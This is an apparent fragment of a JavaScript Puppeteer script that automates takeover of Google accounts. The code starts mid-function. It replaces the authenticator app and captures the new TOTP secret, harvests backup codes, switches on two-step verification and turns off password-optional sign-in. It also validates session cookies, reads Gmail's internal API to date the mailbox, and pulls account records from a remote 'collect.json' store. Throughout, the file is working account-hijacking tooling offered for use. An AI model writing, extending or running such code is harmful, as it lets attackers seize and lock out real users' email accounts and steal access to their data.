            return { auth:null, backup:null, error:true }
        }
        await page.goto('https://myaccount.google.com/two-step-verification/authenticator?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
        await delay(1000)
        let previus = await findView(page, 'button', 'Change authenticator app')
        if (previus) {
            if (await exists(page, 'button[aria-label="Remove Google Authenticator"]')) {
                await page.click('button[aria-label="Remove Google Authenticator"]')
            }
            await delay(500)
            await waitForSelector(page, 'button[data-mdc-dialog-action="ok"]')
            await delay(500)
            await page.click('button[data-mdc-dialog-action="ok"]')
            await delay(1000)
        }
        let newButton = await waitForFindView(page, 'button', 'Set up authenticator', 10)
        await delay(500)
        await newButton.click()
        await delay(2000)
        let canSee = await waitForFindView(page, 'button', 'Can’t scan it?')
        
        if (canSee) {
            await canSee.click()
            await delay(1000)
            let authToken = await page.evaluate(() => {
                let root = document.querySelectorAll('strong')
                if (root) {
                    for (let i = 0; i < root.length; i++) {
                        try {
                            let split = root[i].innerText.split(' ')
                            if (split.length == 8) {
                                return root[i].innerText.replace(/\s/g, '')
                            }
                        } catch (error) {}
                    }
                }
                return null
            })

            if (authToken) {
                await page.click('div[class="sRKBBe"] > div > div:nth-child(2) > div:nth-child(2) > button')
                await delay(1000)
                let newToken = twofactor.generateToken(authToken)
                await waitForSelector(page, 'input[type="text"]')
                await delay(500)
                await page.type('input[type="text"]', newToken.token)
                await delay(500)
                await page.click('div[class="sRKBBe"] > div > div:nth-child(2) > div:nth-child(3) > button')
                await waitForFindView(page, 'button', 'Change authenticator app')
                mAuthToken = authToken

                console.log('Process: [ Auth Token: Received --- '+getTime()+' ]')
            }
        }
    } catch (error) {}

    try {
        let url = await page.url()
        if (url.startsWith('https://accounts.google.com/v3/signin/confirmidentifer')) {
            return { auth:null, backup:null, error:true }
        }
        await page.goto('https://myaccount.google.com/two-step-verification/backup-codes?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
        await delay(500)

        for (let i = 0; i < 30; i++) {
            try {
                if (await exists(page, 'button[aria-label="Generate new codes"]')) {
                    await delay(500)
                    await page.click('button[aria-label="Generate new codes"]')
                    break
                } else {
                    let newButton = await findView(page, 'button', 'Get backup codes')
                    if (newButton) {
                        await newButton.click()
                        break
                    }
                }
            } catch (error) {}

            await delay(500)
        }

        for (let i = 0; i < 30; i++) {
            try {
                let response = await page.waitForResponse(async res => res)
                try {
                    let url = await response.url()
                    if (url.startsWith('https://myaccount.google.com/_/AccountSettingsStrongauthUi/data/batchexecute') && url.includes('two-step-verification')) {
                        let text = await response.text()
                        if (text.includes('"[[')) {
                            let temp = text.substring(text.indexOf('"[[')+2, text.length)
                            let list = JSON.parse(temp.substring(0, temp.indexOf(']')+1).replace(/[\\]/g, ''))
                            let code = ''
                            for (let i = 0; i < list.length; i++) {
                                code += list[i]+'\t'
                            }
                            mBackupCode = code.trim()
                            console.log('Process: [ Backup Code: Received --- '+getTime()+' ]')
                            break
                        }
                    }
                } catch (error) {}
            } catch (error) {
                break
            }
        }
    } catch (error) {}

    try {
        if (mBackupCode || mAuthToken) {
            for (let i = 0; i < 3; i++) {
                try {
                    let url = await page.url()
                    if (url.startsWith('https://accounts.google.com/v3/signin/confirmidentifer')) {
                        return { auth:null, backup:null, error:true }
                    }
                    await page.goto('https://myaccount.google.com/signinoptions/twosv?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
                    await delay(500)
                    await waitForFindView(page, 'h1', '2-Step Verification')
                    await delay(500)
                    
                    if (await exists(page, 'button[aria-label="Turn off 2-Step Verification"]')) {
                        return { auth:mAuthToken, backup:mBackupCode, error:false }
                    } if (await exists(page, 'button[aria-label="Turn on 2-Step Verification"]')) {
                        await page.click('button[aria-label="Turn on 2-Step Verification"]')

                        await waitForSelector(page, 'button[data-mdc-dialog-action="d7k1Xe"]', 5)
                        await delay(500)
                        await page.click('button[data-mdc-dialog-action="d7k1Xe"]')
                        await waitForSelector(page, 'button[data-mdc-dialog-action="TYajJe"]', 5)
                        await delay(500)
                        await page.click('button[data-mdc-dialog-action="TYajJe"]')
        
                        try {
                            await page.waitForResponse(async res => res)
                        } catch (error) {}
        
                        for (let i = 0; i < 20; i++) {
                            try {
                                if (await exists(page, 'button[aria-label="Turn off 2-Step Verification"]')) {
                                    break
                                } else if (await exists(page, 'button[aria-label="Done"]')) {
                                    break
                                } else if (await exists(page, 'div[class="uW2Fw-T0kwCb"]')) {
                                    if (!await exists(page, 'div[class="uW2Fw-T0kwCb"] > div:nth-child(3) > button') && await exists(page, 'div[class="uW2Fw-T0kwCb"] > div:nth-child(1) > button')) {
                                        break
                                    }
                                }
                            } catch (error) {}
                        }
        
                        await delay(1500)
        
                        return { auth:mAuthToken, backup:mBackupCode, error:false }
                    }
                } catch (error) {}
            }

            return { auth:mAuthToken, backup:mBackupCode, error:true }
        }
    } catch (error) {}

    return { auth:null, backup:null, error:true }
}

async function waitForSkipPassworp(page, mRapt) {
    for (let i = 0; i < 3; i++) {
        try {
            await page.goto('https://myaccount.google.com/signinoptions/passwordoptional?hl=en&rapt='+mRapt)
            await delay(500)
    
            let isChecked = await page.evaluate(() => {
                let root = document.querySelector('button[type="button"]')
                if (root) {
                    let checked = root.getAttribute('aria-checked')
                    return checked == 'true' || checked == true
                }
            })
    
            if (isChecked) {
                await page.click('button[type="button"]')
                await delay(1500)
            }

            break
        } catch (e) {}
    }
}

async function isValidCookies(cookies) {
    try {
        let response = await axios.get('https://myaccount.google.com/phone', {
            headers: {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'cookie': cookies,
                'priority': 'u=0, i',
                'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-arch': '"x86"',
                'sec-ch-ua-bitness': '"64"',
                'sec-ch-ua-form-factors': '"Desktop"',
                'sec-ch-ua-full-version': '"131.0.6778.265"',
                'sec-ch-ua-full-version-list': '"Google Chrome";v="131.0.6778.265", "Chromium";v="131.0.6778.265", "Not_A Brand";v="24.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"19.0.0"',
                'sec-ch-ua-wow64': '?0',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            },
            validateStatus: null,
            maxRedirects: 0
        })

        let location = response.headers['location']

        if (location) {
            return false
        } else {
            return true
        }
    } catch (error) {}

    return false
}

async function getMailTokenData(url) {
    if (!url) url = 'https://accounts.google.com/ServiceLogin?service=mail&passive=1209600&osid=1&continue=https://mail.google.com/mail/u/0/&followup=https://mail.google.com/mail/u/0/&emr=1&authuser=0'

    try {
        let response = await axios.get(url, {
            headers: getMailHeaders(mMailCookies),
            validateStatus:null,
            maxRedirects:0
        })

        await putCookies(response.headers['set-cookie'])

        let location = response.headers.location
        
        if (location) {
            return await getMailTokenData(location)
        } else {
            try {
                let data = response.data
                let split = data.split('_GM_setData({')
                for (let i = 0; i < split.length; i++) {
                    try {
                        let json = JSON.parse('{'+split[i].substring(0, split[i].indexOf('});')+1))
                        let details = json['w43KIf']
                        return { token:details[1], key:details[2] }
                    } catch (error) {}
                }
            } catch (error) {}
        }
    } catch (error) {}

    return null
}

async function getMailYear(data) {
    if (data) {
        try {
            let response = await axios.get('https://mail.google.com/mail/u/0/data?token=%5B%22cftp%22,%22'+data.key+'%22,null,null,null,3,%22%22%5D', {
                headers: getMailHeaders(mMailCookies),
                validateStatus:null,
                maxRedirects:0
            })

            await putCookies(response.headers['set-cookie'])

            let mTotal = 0
            let html = response.data
            
            let split = html.split('_GM_setData({')
            for (let i = 0; i < split.length; i++) {
                try {
                    let json = JSON.parse('{'+split[i].substring(0, split[i].indexOf('});')+1))
                    let all = json['hqyl8']
                    if (all) {
                        let json = JSON.parse(all)
                        let temp = json[3][0]
                        for (let j = 0; j < temp.length; j++) {
                            let _all = temp[j].toString()
                            if (_all.includes('^all')) {
                                mTotal = temp[j][2]
                                break
                            }
                        }
                        if (mTotal > 0) {
                            break
                        }
                    }
                } catch (error) {}
            }

            if (mTotal > 0) {
                let page = (Math.ceil(mTotal/50)-1)
                for (let i = 0; i < 2; i++) {
                    try {
                        let response = await axios.post('https://mail.google.com/sync/u/0/i/bv?hl=en&c=0&rt=r&pt=ji',[[57,50,null,"in:^all",[null,null,null,null,0],null,1,2000,null,page,null,null,null,1,null,null,null,null,0,1],null,[0,5,null,null,1,1,1]], {
                            headers: getInboxHeaders(mMailCookies, data.key, data.token),
                            validateStatus:null,
                            maxRedirects:0
                        })

                        await putCookies(response.headers['set-cookie'])
        
                        let list = response.data[2]
                        if(list && list.length > 0) {
                            let date = list[list.length-1][0][2]
                            return new Date(date).getFullYear()
                        }
                    } catch (error) {}

                    if (page > 0) page--
                }
            }
        } catch (error) {}
    }

    return new Date().getFullYear()
}

async function getMailCookie(cookie) {
    let split = cookie.split(';')
    let cookies = {}

    for (let i = 0; i < split.length; i++) {
        try {
            let single = split[i].trim().split('=')
            if (single.length == 2) {
                cookies[single[0]] = single[1]
            }
        } catch (error) {}
    }

    return cookies
}

async function getNewCookies(cookies) {
    let cookie = ''

    for (let i = 0; i < cookies.length; i++) {
        try {
            cookie += cookies[i]['name']+'='+cookies[i]['value']+(i == cookies.length-1 ? '' : '; ')
        } catch (error) {}
    }

    return cookie
}

async function putCookies(data) {
    if (data) {
        for (let i = 0; i < data.length; i++) {
            try {
                let line = data[i].substring(0, data[i].indexOf(';'))
                if (line.startsWith('NID')) {
                    mMailCookies['NID'] = line.substring(4, line.length)
                } else {
                    let split = line.split('=')
                    mMailCookies[split[0]] = split[1]
                }
            } catch (error) {}
        }
    }
    
}

function getMailHeaders(cookies) {
    let cookie = ''
    for (let [key, value] of Object.entries(cookies)) {
        cookie += key+'='+value+'; '
    }
    return {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'cookie': cookie,
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
        'x-browser-channel': 'stable',
        'x-browser-copyright': 'Copyright 2025 Google LLC. All rights reserved.',
        'x-browser-year': '2025',
    }
}

function getInboxHeaders(cookies, key, xToken) {
    let cookie = ''
    for (let [key, value] of Object.entries(cookies)) {
        cookie += key+'='+value+'; '
    }

    let time = new Date().getTime()
    
    return {
        'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6834.160", "Google Chrome";v="132.0.6834.160"',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',       
        'sec-ch-ua-bitness': '"64"',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-form-factors': '"Desktop"',
        'sec-ch-ua-wow64': '?0',
        'sec-ch-ua-arch': '"x86"',
        'sec-ch-ua-full-version': '"132.0.6834.160"',
        'content-type': 'application/json',
        'x-gmail-btai': '[null,null,[null,null,null,null,null,null,null,null,null,1,null,null,1,null,0,1,1,0,1,null,null,1,1,1,1,1,1,1,0,1,1,1,1,1,0,1,"en","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",1,0,25,null,0,1,0,1,1,1,1,1,null,1,1,0,1,1,0,0,null,0,1,null,1,0,null,null,0,null,1,0,1,1,null,0,0,null,null,null,1,100,1,1,0,1,0,null,0,1,1,1,1,null,null,0,null,1,0,1,0,0,0,0,0],null,"'+key+'",null,25,"gmail.pinto-server_20250202.07_p0",1,5,"",21600000,"+06:00",null,null,722398589,"","",'+time+']',
        'x-framework-xsrf-token': xToken,
        'referer': 'https://mail.google.com/mail/u/0/',
        'x-google-btd': '1',
        'x-gmail-storage-request': '',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
        'sec-ch-ua-platform-version': '"19.0.0"',
        'accept': '*/*',
        'cookie': cookie,
        'origin': 'https://mail.google.com'
    }
}

async function getName() {
    for (let i = 0; i < 3; i++) {
        try {
            let response = await axios.get(DATABASE_URL+'name/english/male/'+getRandomInt(0, 94929)+'.json')
            if (response.data) {
                return response.data
            }
        } catch (error) {}
    }
}

async function getRapt(url) {
    try {
        if (url.includes('rapt=')) {
            let temp = url.substring(url.indexOf('rapt=')+5, url.length)

            if (temp.includes('&')) {
                return temp.substring(0, temp.indexOf('&'))
            } else {
                return temp
            }
        }
    } catch (error) {}

    return null
}

async function waitForSelector(page, element, _timeout = 30) {

    for (let i = 0; i < _timeout; i++) {
        try {
            let data = await exists(page, element)
            if (data) {
                break
            }
        } catch (error) {}

        await delay(500)
    }
}

async function exists(page, element) {
    return await page.evaluate((element) => {
        let root = document.querySelector(element)
        if (root) {
            return true
        }
        return false
    }, element)
}

async function getGmailData() {

    try {
        let response = await axios.get(BASE_URL+'collect.json?orderBy=%22$key%22&limitToFirst=1')
        let data = response.data
        if (data) {
            let number = Object.keys(data)[0]
            let value = data[number]
            value['number'] = number
            return value
        }
    } catch (error) {}

    return null
}

function getRandomUser() {
    let L = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
    let N = ['0','1','2','3','4','5','6','7','8','9']
    
    let user = ''

    for (let i = 0; i < 10; i++) {
        user += L[Math.floor((Math.random() * L.length))]
    }

    for (let i = 0; i < 5; i++) {
        user += N[Math.floor((Math.random() * N.length))]
    }

    return user
}

function getRandomPass() {
    let L = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
    let N = ['0','1','2','3','4','5','6','7','8','9']
    
    let pass = L[Math.floor((Math.random() * L.length))].toUpperCase()

    for (let i = 0; i < 6; i++) {
        pass += L[Math.floor((Math.random() * L.length))]
    }

    for (let i = 0; i < 3; i++) {
        pass += N[Math.floor((Math.random() * N.length))]
    }

    return pass
}

function decrypt(text) {
    try {
        let argv = process.argv.slice(2)
        if (argv.length < 3) {
            return null
        }
        let key = Buffer.from(argv[1], 'base64')
        let iv  = Buffer.from(argv[2], 'base64')
        let cipher = crypto.createDecipheriv('aes-192-cbc', key, iv)
        return cipher.update(text, 'base64', 'utf8') + cipher.final('utf8')
    } catch (e) {
        return null
    }
}

function encrypt(text) {
    try {
        let argv = process.argv.slice(2)
        if (argv.length < 3) {
            return text
        }
        let key = Buffer.from(argv[1], 'base64')
        let iv  = Buffer.from(argv[2], 'base64')
        let cipher = crypto.createCipheriv('aes-192-cbc', key, iv)
        return cipher.update(text, 'utf8', 'base64') + cipher.final('base64')
    } catch (e) {
        return text
    }
}

function deviceList(data) {
    let arrays = {}

    try {
        if (data) {
            let json = JSON.parse(data[0][2])
            let list = json[1]

            for(let i=0; i<list.length; i++) {
                let child = list[i][2]

                for(let j=0; j<child.length; j++) {
                    let main = child[j]

                    if(main.length > 23) {
                        if(main[12] == true && main[13] != null && main[22] != null && main[22] != 1) {
                            arrays[main[0]] = {
                                name : main[1],
                                token : main[13],
                                active: main[9]
                            }
                        }
                    }
                }
            }   
        }
    } catch (error) {}

    return arrays
}

function extractArrays(raw) {
    raw = raw.replace(/^\)\]\}'\s*/g, '')

    let lines = raw.split('\n')

    let arrays = []

    for (let i = 0; i < lines.length; i++) {
        let line = lines[i].trim()

        if (line.startsWith('[')) {
            try {
                arrays.push(JSON.parse(line))
            } catch {}
        }
    }

    return arrays
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min
}

function decode(data) {
    return Buffer.from(data, 'base64').toString('ascii')
}

function getTime() {
    return new Date().toLocaleTimeString('en-us', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' }).replace(',', '')
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
